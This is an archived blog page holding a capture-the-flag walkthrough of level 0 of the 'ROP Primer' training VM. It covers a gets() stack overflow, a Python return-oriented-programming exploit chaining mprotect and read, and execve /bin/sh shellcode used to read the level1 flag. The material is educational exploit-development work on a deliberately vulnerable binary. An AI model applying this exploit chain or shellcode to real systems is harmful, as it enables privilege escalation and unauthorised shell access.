@@ -1,0 +1,933 @@
+<!DOCTYPE html>
+<html lang="en" class="no-js">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="profile" href="http://gmpg.org/xfn/11">
+<link rel="pingback" href="https://xmgv.wordpress.com/xmlrpc.php">
+<script>(function(html){html.className = html.className.replace(/\bno-js\b/,'js')})(document.documentElement);</script>
+<title>ROP Primer: Level 0 &#8211; oh-la-la</title>
+<link rel='dns-prefetch' href='//s2.wp.com' />
+<link rel='dns-prefetch' href='//s1.wp.com' />
+<link rel='dns-prefetch' href='//s0.wp.com' />
+<link rel='dns-prefetch' href='//fonts.googleapis.com' />
+<link rel='dns-prefetch' href='//s.pubmine.com' />
+<link rel='dns-prefetch' href='//x.bidswitch.net' />
+<link rel='dns-prefetch' href='//static.criteo.net' />
+<link rel='dns-prefetch' href='//ib.adnxs.com' />
+<link rel='dns-prefetch' href='//aax.amazon-adsystem.com' />
+<link rel='dns-prefetch' href='//bidder.criteo.com' />
+<link rel='dns-prefetch' href='//cas.criteo.com' />
+<link rel='dns-prefetch' href='//gum.criteo.com' />
+<link rel='dns-prefetch' href='//ads.pubmatic.com' />
+<link rel='dns-prefetch' href='//gads.pubmatic.com' />
+<link rel='dns-prefetch' href='//tpc.googlesyndication.com' />
+<link rel='dns-prefetch' href='//ad.doubleclick.net' />
+<link rel='dns-prefetch' href='//googleads.g.doubleclick.net' />
+<link rel='dns-prefetch' href='//www.googletagservices.com' />
+<link rel='dns-prefetch' href='//cdn.switchadhub.com' />
+<link rel='dns-prefetch' href='//delivery.g.switchadhub.com' />
+<link rel='dns-prefetch' href='//delivery.swid.switchadhub.com' />
+<link rel="alternate" type="application/rss+xml" title="oh-la-la &raquo; Feed" href="https://xmgv.wordpress.com/feed/" />
+<link rel="alternate" type="application/rss+xml" title="oh-la-la &raquo; Comments Feed" href="https://xmgv.wordpress.com/comments/feed/" />
+<link rel="alternate" type="application/rss+xml" title="oh-la-la &raquo; ROP Primer: Level&nbsp;0 Comments Feed" href="https://xmgv.wordpress.com/2015/08/15/rop-primer-level-0/feed/" />
+	<script type="text/javascript">
+		/* <![CDATA[ */
+		function addLoadEvent(func) {
+			var oldonload = window.onload;
+			if (typeof window.onload != 'function') {
+				window.onload = func;
+			} else {
+				window.onload = function () {
+					oldonload();
+					func();
+				}
+			}
+		}
+		/* ]]> */
+	</script>
+			<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s0.wp.com\/wp-content\/mu-plugins\/wpcom-smileys\/twemoji\/2\/72x72\/","ext":".png","svgUrl":"https:\/\/s0.wp.com\/wp-content\/mu-plugins\/wpcom-smileys\/twemoji\/2\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/s1.wp.com\/wp-includes\/js\/wp-emoji-release.min.js?m=1532082729h&ver=4.9.8"}};
+			!function(a,b,c){function d(a,b){var c=String.fromCharCode;l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,a),0,0);var d=k.toDataURL();l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,b),0,0);var e=k.toDataURL();return d===e}function e(a){var b;if(!l||!l.fillText)return!1;switch(l.textBaseline="top",l.font="600 32px Arial",a){case"flag":return!(b=d([55356,56826,55356,56819],[55356,56826,8203,55356,56819]))&&(b=d([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]),!b);case"emoji":return b=d([55358,56760,9792,65039],[55358,56760,8203,9792,65039]),!b}return!1}function f(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var g,h,i,j,k=b.createElement("canvas"),l=k.getContext&&k.getContext("2d");for(j=Array("flag","emoji"),c.supports={everything:!0,everythingExceptFlag:!0},i=0;i<j.length;i++)c.supports[j[i]]=e(j[i]),c.supports.everything=c.supports.everything&&c.supports[j[i]],"flag"!==j[i]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[j[i]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(h=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",h,!1),a.addEventListener("load",h,!1)):(a.attachEvent("onload",h),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),g=c.source||{},g.concatemoji?f(g.concatemoji):g.wpemoji&&g.twemoji&&(f(g.twemoji),f(g.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+<link rel='stylesheet' id='all-css-0-1' href='https://s0.wp.com/_static/??-eJyFkN0OwiAMhV9IRBc344XxWfhpNiYFQlkW315wUeM0eEN6yvk4pXwOTHmXwCWOEwt26o0jPgflkREaC7eV2iqiDf+NWXMF4iOkINSVPdSXXVrfv3N81EIT762XwtaejmBFAs2Cp7RSNUz5CLmPQaTiQNBGgAXMthqGoXtSpRzyd6oxy4akDBGIWD7RTMjSkIP+jIdllGVVPBs/OwtquPPJZJpeRbm44HnfNodjd9o17XgHTP2rhA==?cssminify=yes' type='text/css' media='all' />
+<link rel='stylesheet' id='afterlight-fonts-css'  href='https://fonts.googleapis.com/css?family=Playfair+Display%3A400%2C700%2C400italic%2C700italic%7CLato%3A400%2C700%2C400italic%2C700italic%7CInconsolata%3A400&#038;subset=latin%2Clatin-ext' type='text/css' media='all' />
+<link rel='stylesheet' id='all-css-2-1' href='https://s1.wp.com/_static/??-eJyNj0sOwjAMRC9EsAqlrBBnSYObGpyPElcVtyeomyBKxc6jmTe2YY7KBC/oBdykIk+WfAaLHhMV48e4NznvoGJlRIcZ4tSDHgQTkx0FsjwZ/8ySN0tezdEE90VV1810sygZcCpueBAq1jMIushaSvP62pWCHAxpVst3tdiCLQbFwWih4D+EGlhT2kIT9hxsGS2UVCXf0NVdmtPh3B3bpu3uLxyzmhA=?cssminify=yes' type='text/css' media='all' />
+<link rel='stylesheet' id='print-css-3-1' href='https://s2.wp.com/wp-content/mu-plugins/global-print/global-print.css?m=1465851035h&cssminify=yes' type='text/css' media='print' />
+<link rel='stylesheet' id='all-css-4-1' href='https://s0.wp.com/_static/??-eJx9i0EKQjEMBS9kDdVfXIlnyS+1jaRJafLx+uJCRBRXbx7MwH2ErOJFHPoWBm+VxACzk8qK8037bLaD3/pQ83BlpAnWcJLU1/6rTDMhB9aqn+cr8lZ6MWgLVNYV+Slc+jmmQzrFtMTj7QHFQEmu?cssminify=yes' type='text/css' media='all' />
+<script type='text/javascript'>
+/* <![CDATA[ */
+var related_posts_js_options = {"post_heading":"h4"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://s2.wp.com/_static/??-eJyFj90KwjAMhV/IrAw6xQvxWWoXS2r/bNoNfXo70At1KARCTr4cTsScgIJ2dUQWttW1Yr49W2d5I34B4MlkVbDzFF6wjqFgKAvr44kcQmXMyjStGZ3jCpciF4/MDVrZvkeiMBHOfzGLJSl9gYxM9y9XXyG5aiiwyOjaAyMsGT6mdnX0h17uh36Qcre1DyuucHk='></script>
+<link rel='stylesheet' id='all-css-0-2' href='https://s0.wp.com/wp-content/mu-plugins/highlander-comments/style.css?m=1530132353h&cssminify=yes' type='text/css' media='all' />
+<!--[if lt IE 8]>
+<link rel='stylesheet' id='highlander-comments-ie7-css'  href='https://s2.wp.com/wp-content/mu-plugins/highlander-comments/style-ie7.css?m=1351637563h&#038;ver=20110606' type='text/css' media='all' />
+<![endif]-->
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://xmgv.wordpress.com/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://s1.wp.com/wp-includes/wlwmanifest.xml" /> 
+<link rel='prev' title='ASIS CTF Quals 2015:&nbsp;Zrypt' href='https://xmgv.wordpress.com/2015/05/11/asis-ctf-quals-2015-zrypt/' />
+<link rel='next' title='ROP Primer: Level&nbsp;1' href='https://xmgv.wordpress.com/2015/08/17/rop-primer-level-1/' />
+<meta name="generator" content="WordPress.com" />
+<link rel="canonical" href="https://xmgv.wordpress.com/2015/08/15/rop-primer-level-0/" />
+<link rel='shortlink' href='https://wp.me/p5jtdb-2F' />
+<link rel="alternate" type="application/json+oembed" href="https://public-api.wordpress.com/oembed/?format=json&amp;url=https%3A%2F%2Fxmgv.wordpress.com%2F2015%2F08%2F15%2Frop-primer-level-0%2F&amp;for=wpcom-auto-discovery" /><link rel="alternate" type="application/xml+oembed" href="https://public-api.wordpress.com/oembed/?format=xml&amp;url=https%3A%2F%2Fxmgv.wordpress.com%2F2015%2F08%2F15%2Frop-primer-level-0%2F&amp;for=wpcom-auto-discovery" />
+<!-- Jetpack Open Graph Tags -->
+<meta property="og:type" content="article" />
+<meta property="og:title" content="ROP Primer: Level 0" />
+<meta property="og:url" content="https://xmgv.wordpress.com/2015/08/15/rop-primer-level-0/" />
+<meta property="og:description" content="Barrebas from the Vulnhub CTF Team was kind enough to create a VM with three exercises to get started in return-oriented programming. This blog post covers the first level. There’s also an accompan…" />
+<meta property="article:published_time" content="2015-08-16T02:39:18+00:00" />
+<meta property="article:modified_time" content="2015-08-20T22:32:48+00:00" />
+<meta property="og:site_name" content="oh-la-la" />
+<meta property="og:image" content="https://s0.wp.com/i/blank.jpg" />
+<meta property="og:locale" content="en_US" />
+<meta name="twitter:site" content="@wordpressdotcom" />
+<meta name="twitter:text:title" content="ROP Primer: Level&nbsp;0" />
+<meta name="twitter:card" content="summary" />
+<meta property="fb:app_id" content="249643311490" />
+<meta property="article:publisher" content="https://www.facebook.com/WordPresscom" />
+
+<!-- End Jetpack Open Graph Tags -->
+<link rel="shortcut icon" type="image/x-icon" href="https://s1.wp.com/i/favicon.ico" sizes="16x16 24x24 32x32 48x48" />
+<link rel="icon" type="image/x-icon" href="https://s1.wp.com/i/favicon.ico" sizes="16x16 24x24 32x32 48x48" />
+<link rel="apple-touch-icon-precomposed" href="https://s2.wp.com/i/webclip.png" />
+<link rel='openid.server' href='https://xmgv.wordpress.com/?openidserver=1' />
+<link rel='openid.delegate' href='https://xmgv.wordpress.com/' />
+<link rel="search" type="application/opensearchdescription+xml" href="https://xmgv.wordpress.com/osd.xml" title="oh-la-la" />
+<link rel="search" type="application/opensearchdescription+xml" href="https://s1.wp.com/opensearch.xml" title="WordPress.com" />
+<meta name="theme-color" content="#1a1a1a" />
+		<style type="text/css">
+			.recentcomments a {
+				display: inline !important;
+				padding: 0 !important;
+				margin: 0 !important;
+			}
+
+			table.recentcommentsavatartop img.avatar, table.recentcommentsavatarend img.avatar {
+				border: 0px;
+				margin: 0;
+			}
+
+			table.recentcommentsavatartop a, table.recentcommentsavatarend a {
+				border: 0px !important;
+				background-color: transparent !important;
+			}
+
+			td.recentcommentsavatarend, td.recentcommentsavatartop {
+				padding: 0px 0px 1px 0px;
+				margin: 0px;
+			}
+
+			td.recentcommentstextend {
+				border: none !important;
+				padding: 0px 0px 2px 10px;
+			}
+
+			.rtl td.recentcommentstextend {
+				padding: 0px 10px 2px 0px;
+			}
+
+			td.recentcommentstexttop {
+				border: none;
+				padding: 0px 0px 0px 10px;
+			}
+
+			.rtl td.recentcommentstexttop {
+				padding: 0px 10px 0px 0px;
+			}
+		</style>
+		<meta name="application-name" content="oh-la-la" /><meta name="msapplication-window" content="width=device-width;height=device-height" /><meta name="msapplication-task" content="name=Subscribe;action-uri=https://xmgv.wordpress.com/feed/;icon-uri=https://s1.wp.com/i/favicon.ico" /><meta name="msapplication-task" content="name=Sign up for a free blog;action-uri=http://wordpress.com/signup/;icon-uri=https://s1.wp.com/i/favicon.ico" /><meta name="msapplication-task" content="name=WordPress.com Support;action-uri=http://support.wordpress.com/;icon-uri=https://s1.wp.com/i/favicon.ico" /><meta name="msapplication-task" content="name=WordPress.com Forums;action-uri=http://forums.wordpress.com/;icon-uri=https://s1.wp.com/i/favicon.ico" /><meta name="description" content="Barrebas from the Vulnhub CTF Team was kind enough to create a VM with three exercises to get started in return-oriented programming. This blog post covers the first level. There’s also an accompanying presentation that is definitely worth reading. Thanks a lot to Barrebas for putting it all together. Let’s start by logging in as&hellip;" />
+		<script type="text/javascript">
+		function __ATA_CC() {var v = document.cookie.match('(^|;) ?personalized-ads-consent=([^;]*)(;|$)');return v ? 1 : 0;}
+		var __ATA_PP = { pt: 1, ht: 0, tn: 'afterlight', amp: false, siteid: 8982, consent: __ATA_CC() };
+		var __ATA = __ATA || {};
+		__ATA.cmd = __ATA.cmd || [];
+		__ATA.criteo = __ATA.criteo || {};
+		__ATA.criteo.cmd = __ATA.criteo.cmd || [];
+		</script>
+		<script type="text/javascript" src="//s.pubmine.com/head.js" async></script><link rel="amphtml" href="https://xmgv.wordpress.com/2015/08/15/rop-primer-level-0/amp/"><style type="text/css" id="syntaxhighlighteranchor"></style>
+<script type="text/javascript">
+	window.google_analytics_uacct = "UA-52447-2";
+</script>
+
+<script type="text/javascript">
+	var _gaq = _gaq || [];
+	_gaq.push(['_setAccount', 'UA-52447-2']);
+	_gaq.push(['_setDomainName', 'wordpress.com']);
+	_gaq.push(['_initData']);
+	_gaq.push(['_trackPageview']);
+
+	(function() {
+		var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+		ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+		(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(ga);
+	})();
+</script>
+</head>
+
+<body class="post-template-default single single-post postid-165 single-format-standard mp6 customizer-styles-applied has-overlay widgets-hidden highlander-enabled highlander-dark">
+<div id="page" class="hfeed site">
+	<a class="skip-link screen-reader-text" href="#content">Skip to content</a>
+
+	
+	<header id="masthead" class="site-header" role="banner">
+		<div class="site-header-top">
+			
+							<button id="sidebar-toggle" class="sidebar-toggle"></button>
+					</div><!-- .site-header-top -->
+
+		<div class="site-branding">
+			<div class="site-branding-inner">
+				
+									<p class="site-title"><a href="https://xmgv.wordpress.com/" rel="home">oh-la-la</a></p>
+							</div>
+
+					</div><!-- .site-branding -->
+	</header><!-- .site-header -->
+
+	<div id="content" class="site-content">
+
+	<div id="primary" class="content-area">
+		<main id="main" class="site-main" role="main">
+
+		
+<article id="post-165" class="post-165 post type-post status-publish format-standard hentry category-ctf category-vulnhub tag-ctf tag-vulnhub">
+	<header class="entry-header">
+		<div class="entry-date">
+			<span class="posted-on"><span class="screen-reader-text">Posted on </span><a href="https://xmgv.wordpress.com/2015/08/15/rop-primer-level-0/" rel="bookmark"><time class="entry-date published" datetime="2015-08-15T23:39:18+00:00">15 August, 2015</time><time class="updated" datetime="2015-08-20T19:32:48+00:00">20 August, 2015</time></a></span>		</div>
+
+		<h1 class="entry-title">ROP Primer: Level&nbsp;0</h1>	</header>
+
+	
+	<div class="entry-content">
+		<p>Barrebas from the <a href="https://ctf-team.vulnhub.com">Vulnhub CTF Team</a> was kind enough to create <a href="https://www.vulnhub.com/entry/rop-primer-02,114/">a VM</a> with three exercises to get started in return-oriented programming. This blog post covers the first level. </p>
+<p>There’s also an <a href="https://speakerdeck.com/barrebas/rop-primer">accompanying presentation</a> that is definitely worth reading. Thanks a lot to Barrebas for putting it all together.</p>
+<p>Let’s start by logging in as the <code>level0</code> user and running the binary.</p>
+<pre><code>level0@rop:~$ ls -l
+total 588
+-rw-r—— 1 level1 level1     25 Jan 20  2015 flag
+-rwsr-xr-x 1 level1 level1 595992 Jan 20  2015 level0
+level0@rop:~$ ./level0
+[+] ROP tutorial level0
+[+] What's your name? heyhey
+[+] Bet you can't ROP me, heyhey!
+level0@rop:~$ ./level0
+[+] ROP tutorial level0
+[+] What's your name? lkasdjlkasjdlkasjdljsaldkjasldjlasdjlaskjdslkajdlkasjdaklsjd
+[+] Bet you can't ROP me, lkasdjlkasjdlkasjdljsaldkjasldjlasdjlaskjdslkajdlkasjdaklsjd!
+Segmentation fault
+</code></pre>
+<p>The program reads a name from the standard input, and based on the <code>Segmentation fault</code> received we know that it doesn’t do a great job at checking its length.</p>
+<p>What protections are in place?</p>
+<pre><code>level0@rop:~$ cat /proc/sys/kernel/randomize_va_space 
+0
+</code></pre>
+<p>ASLR is disabled. What about other mitigations? We can use the <code>checksec</code> script to find out.</p>
+<pre><code>level0@rop:~$ gdb -q ./level0
+Reading symbols from ./level0…(no debugging symbols found)…done.
+gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : disabled
+</code></pre>
+<p>The stack is not executable, so we can’t just place shellcode in it and expect it to run. </p>
+<p>Next step is to disassemble <code>main</code>.</p>
+<pre><code>Breakpoint 1, 0x08048257 in main ()
+gdb-peda$ disas
+Dump of assembler code for function main:
+   0x08048254 &lt;+0&gt;: push   ebp
+   0x08048255 &lt;+1&gt;: mov    ebp,esp
+=&gt; 0x08048257 &lt;+3&gt;: and    esp,0xfffffff0
+   0x0804825a &lt;+6&gt;: sub    esp,0x30
+   0x0804825d &lt;+9&gt;: mov    DWORD PTR [esp],0x80ab668
+   0x08048264 &lt;+16&gt;:    call   0x8048f40 &lt;puts&gt;
+   0x08048269 &lt;+21&gt;:    mov    DWORD PTR [esp],0x80ab680
+   0x08048270 &lt;+28&gt;:    call   0x8048d80 &lt;printf&gt;
+   0x08048275 &lt;+33&gt;:    lea    eax,[esp+0x10]
+   0x08048279 &lt;+37&gt;:    mov    DWORD PTR [esp],eax
+   0x0804827c &lt;+40&gt;:    call   0x8048db0 &lt;gets&gt;
+   0x08048281 &lt;+45&gt;:    lea    eax,[esp+0x10]
+   0x08048285 &lt;+49&gt;:    mov    DWORD PTR [esp+0x4],eax
+   0x08048289 &lt;+53&gt;:    mov    DWORD PTR [esp],0x80ab698
+   0x08048290 &lt;+60&gt;:    call   0x8048d80 &lt;printf&gt;
+   0x08048295 &lt;+65&gt;:    mov    eax,0x0
+   0x0804829a &lt;+70&gt;:    leave  
+   0x0804829b &lt;+71&gt;:    ret    
+End of assembler dump.
+</code></pre>
+<p><code>gets</code> cannot be used securely, since it doesn’t do any bounds checking. We can override the return address by providing input of the correct length, which is 48 bytes in this case. The last 4 bytes will overwrite the saved EIP.</p>
+<pre><code>[+] What's your name? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+[+] Bet you can't ROP me, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB!
+
+Program received signal SIGSEGV, Segmentation fault.
+[—————————————————registers—————————————————]
+EAX: 0x0 
+EBX: 0x0 
+ECX: 0xbffff69c —&gt; 0x80ca720 —&gt; 0xfbad2a84 
+EDX: 0x80cb690 —&gt; 0x0 
+ESI: 0x80488e0 (&lt;__libc_csu_fini&gt;:  push   ebp)
+EDI: 0x4217c6cf 
+EBP: 0x41414141 ('AAAA')
+ESP: 0xbffff6f0 —&gt; 0x0 
+EIP: 0x42424242 ('BBBB')
+EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[——————————————————code——————————————————]
+Invalid $PC address: 0x42424242
+[——————————————————stack——————————————————]
+0000| 0xbffff6f0 ——————————————————&gt; 0x0 
+0004| 0xbffff6f4 ——————————————————&gt; 0xbffff784 ——————————————————&gt; 0xbffff8af ("/home/level0/level0")
+0008| 0xbffff6f8 ——————————————————&gt; 0xbffff78c ——————————————————&gt; 0xbffff8c3 ("XDG_SESSION_ID=2")
+0012| 0xbffff6fc ——————————————————&gt; 0x0 
+0016| 0xbffff700 ——————————————————&gt; 0x0 
+0020| 0xbffff704 ——————————————————&gt; 0x0 
+0024| 0xbffff708 ——————————————————&gt; 0x0 
+0028| 0xbffff70c ——————————————————&gt; 0x0 
+[———————————————————————————————————————]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x42424242 in ?? ()
+</code></pre>
+<p>The idea to is to spawn a shell, so let’s get the address of <code>system</code>.</p>
+<pre><code>gdb-peda$ p system
+No symbol table is loaded.  Use the "file" command.
+</code></pre>
+<p>There’s no system! This means calling <code>system("/bin/sh")</code> is not possible with this binary.</p>
+<p>However, we still have <code>mprotect</code> and <code>read</code>. It’s possible to mark some memory area as writable and executable, read the shellcode from STDIN and direct execution there.</p>
+<pre><code>gdb-peda$ p mprotect
+$3 = {&lt;text variable, no debug info&gt;} 0x80523e0 &lt;mprotect&gt;
+gdb-peda$ p read
+$4 = {&lt;text variable, no debug info&gt;} 0x80517f0 &lt;read&gt;
+</code></pre>
+<p><code>vmmap</code> is a useful command to see how memory is mapped.</p>
+<pre><code>Breakpoint 1, 0x08048257 in main ()
+gdb-peda$ vmmap
+Start      End        Perm  Name
+0x08048000 0x080ca000 r-xp  /home/level0/level0
+0x080ca000 0x080cb000 rw-p  /home/level0/level0
+0x080cb000 0x080ef000 rw-p  [heap]
+0xb7fff000 0xb8000000 r-xp  [vdso]
+0xbffdf000 0xc0000000 rw-p  [stack]
+</code></pre>
+<p><code>mprotect</code> takes three parameters: the memory address, the length in bytes, and a bitmap specifying the protection level. Let’s just call it on 4KB of the memory mapped to the binary and set the protection level to <code>PROT_READ | PROT_WRITE | PROT_EXEC</code>.</p>
+<pre><code>level0@rop:~$ cat exp.py 
+#!/bin/env python
+
+import struct
+
+def p(x):
+    return struct.pack('&lt;L', x)
+
+mprotect = 0x080523e0
+
+# empty payload
+payload = ""
+
+# padding
+payload += "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+
+# mark memory as rwx
+payload += p(mprotect)
+payload += "BBBB"
+payload += p(0x080ca000)    # address
+payload += p(0x1000)        # size
+payload += p(0x7)           # PROT_READ| PROT_WRITE| PROT_EXEC
+
+print payload
+</code></pre>
+<p>If the exploit works correctly, the program will <code>SIGSEGV</code> with EIP pointing to <code>0x42424242</code> and 4KB starting from <code>0x804ca000</code> will be marked as <code>rwx</code>.</p>
+<pre><code>level0@rop:~$ python exp.py &gt; input
+
+gdb-peda$ b main
+Breakpoint 1 at 0x8048257
+gdb-peda$ r &lt; input
+Breakpoint 1, 0x08048257 in main ()
+gdb-peda$ vmmap
+Start      End        Perm  Name
+0x08048000 0x080ca000 r-xp  /home/level0/level0
+0x080ca000 0x080cb000 rw-p  /home/level0/level0
+0x080cb000 0x080ef000 rw-p  [heap]
+0xb7fff000 0xb8000000 r-xp  [vdso]
+0xbffdf000 0xc0000000 rw-p  [stack]
+
+Stopped reason: SIGSEGV
+0x42424242 in ?? ()
+gdb-peda$ vmmap
+Start      End        Perm  Name
+0x08048000 0x080ca000 r-xp  /home/level0/level0
+0x080ca000 0x080cb000 rwxp  /home/level0/level0
+0x080cb000 0x080ef000 rw-p  [heap]
+0xb7ffd000 0xb7fff000 rw-p  mapped
+0xb7fff000 0xb8000000 r-xp  [vdso]
+0xbffdf000 0xc0000000 rw-p  [stack]
+</code></pre>
+<p>It worked.</p>
+<p>We now need to get rid of <code>mprotect</code>’s parameters in the stack and redirect execution to the next gadget. There are three parameters left in the stack, so we need a <code>POP-POP-POP-RET</code> gadget.</p>
+<pre><code>gdb-peda$ ropgadget
+ret = 0x8048106
+addesp_4 = 0x804a278
+popret = 0x8048550
+pop2ret = 0x8048883
+pop4ret = 0x8048881
+pop3ret = 0x8048882
+addesp_8 = 0x804b7f8
+</code></pre>
+<p>We can use the <code>pop3ret</code> gadget available at <code>0x8048882</code>.</p>
+<p>The next step is to call <code>read</code> on STDIN so we can insert the desired shellcode into the <code>wx</code> memory region. <code>read</code> takes three parameters: a file descriptor, a pointer to the buffer where the input will be stored, and the number of bytes to read.</p>
+<p>We want to execute the shellcode after it is read, so we can set the return address to the start of the executable region (<code>0x080ca000</code>).</p>
+<p>The final exploit looks like the following:</p>
+<pre><code>#!/bin/env python
+
+import struct
+
+def p(x):
+    return struct.pack('&lt;L', x)
+
+mprotect = 0x080523e0
+pop3ret = 0x8048882
+read = 0x080517f0
+
+# empty payload
+payload = ""
+
+# padding
+payload += "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+
+# mark memory as rwx
+payload += p(mprotect)
+payload += p(pop3ret)
+payload += p(0x080ca000)    # address
+payload += p(0x1000)        # size
+payload += p(0x7)           # PROT_READ| PROT_WRITE| PROT_EXEC
+
+# read shellcode from stdin
+payload += p(read)
+payload += p(0x080ca000)
+payload += p(0x0)           # fd = STDIN
+payload += p(0x080ca000)    # buf
+payload += p(0x100)         # nbyte
+
+print payload
+</code></pre>
+<p>It’s always a good idea to start with a simple <code>int3</code> shellcode that generates a trap exception. This ensures that the shellcode is indeed being executed.</p>
+<pre><code>level0@rop:~$ (python ./exp.py; python -c 'print "\xcc"') | ./level0 
+[+] ROP tutorial level0
+[+] What's your name? [+] Bet you can't ROP me, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA??!
+Trace/breakpoint trap
+</code></pre>
+<p>Replacing <code>\xcc</code> with a shell spawning shellcode should allow us to read the flag.</p>
+<pre><code>level0@rop:~$ (python ./exp.py; python -c 'print "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"') | ./level0 
+[+] ROP tutorial level0
+[+] What's your name? [+] Bet you can't ROP me, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA??!
+level0@rop:~$ id
+uid=1000(level0) gid=1000(level0) groups=1000(level0)
+</code></pre>
+<p>Why are we still <code>level0</code>? Let’s keep the shell alive!</p>
+<pre><code>level0@rop:~$ (python ./exp.py; python -c 'print "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"'; cat) | ./level0 
+[+] ROP tutorial level0
+[+] What's your name? [+] Bet you can't ROP me, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA??!
+whoami
+level1
+cat flag
+flag{rop_the_night_away}
+</code></pre>
+<div id="atatags-370373-5b88beb4c2540">
+        <script type="text/javascript">
+            __ATA.cmd.push(function() {
+                __ATA.initVideoSlot('atatags-370373-5b88beb4c2540', {
+                    sectionId: '370373',
+                    format: 'inread'
+                });
+            });
+        </script>
+    </div>		<div class="wpcnt">
+			<div class="wpa wpmrec">
+				<span class="wpa-about">Advertisements</span>
+				<div class="u">		<div style="padding-bottom:15px;width:300px;height:250px;float:left;margin-right:5px;margin-top:0px">
+		<div id="atatags-26942-5b88beb4c257b">
+			<script type="text/javascript">
+			__ATA.cmd.push(function() {
+				__ATA.initSlot('atatags-26942-5b88beb4c257b',  {
+					collapseEmpty: 'before',
+					sectionId: '26942',
+					width: 300,
+					height: 250
+				});
+			});
+			</script>
+		</div></div>		<div style="padding-bottom:15px;width:300px;height:250px;float:left;margin-top:0px">
+		<div id="atatags-114160-5b88beb4c257e">
+			<script type="text/javascript">
+			__ATA.cmd.push(function() {
+				__ATA.initSlot('atatags-114160-5b88beb4c257e',  {
+					collapseEmpty: 'before',
+					sectionId: '114160',
+					width: 300,
+					height: 250
+				});
+			});
+			</script>
+		</div></div></div>
+				
+			</div>
+		</div><div id="jp-post-flair" class="sharedaddy sharedaddy-dark sd-like-enabled sd-sharing-enabled"><div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon-text sd-sharing"><h3 class="sd-title">Compártelo:</h3><div class="sd-content"><ul><li class="share-twitter"><a rel="nofollow noopener noreferrer" data-shared="sharing-twitter-165" class="share-twitter sd-button share-icon" href="https://xmgv.wordpress.com/2015/08/15/rop-primer-level-0/?share=twitter" target="_blank" title="Click to share on Twitter"><span>Twitter</span></a></li><li class="share-facebook"><a rel="nofollow noopener noreferrer" data-shared="sharing-facebook-165" class="share-facebook sd-button share-icon" href="https://xmgv.wordpress.com/2015/08/15/rop-primer-level-0/?share=facebook" target="_blank" title="Click to share on Facebook"><span>Facebook</span></a></li><li class="share-google-plus-1"><a rel="nofollow noopener noreferrer" data-shared="sharing-google-165" class="share-google-plus-1 sd-button share-icon" href="https://xmgv.wordpress.com/2015/08/15/rop-primer-level-0/?share=google-plus-1" target="_blank" title="Click to share on Google+"><span>Google</span></a></li><li class="share-end"></li></ul></div></div></div><div class='sharedaddy sd-block sd-like jetpack-likes-widget-wrapper jetpack-likes-widget-unloaded' id='like-post-wrapper-78522205-165-5b88beb4c3a17' data-src='//widgets.wp.com/likes/index.html?ver=20180319#blog_id=78522205&amp;post_id=165&amp;origin=xmgv.wordpress.com&amp;obj_id=78522205-165-5b88beb4c3a17' data-name='like-post-frame-78522205-165-5b88beb4c3a17'><h3 class='sd-title'>Like this:</h3><div class='likes-widget-placeholder post-likes-widget-placeholder' style='height: 55px;'><span class='button'><span>Like</span></span> <span class="loading">Loading...</span></div><span class='sd-text-color'></span><a class='sd-link-color'></a></div>
+<div id='jp-relatedposts' class='jp-relatedposts' >
+	<h3 class="jp-relatedposts-headline"><em>Related</em></h3>
+</div></div>			</div><!-- .entry-content -->
+
+	<footer class="entry-footer">
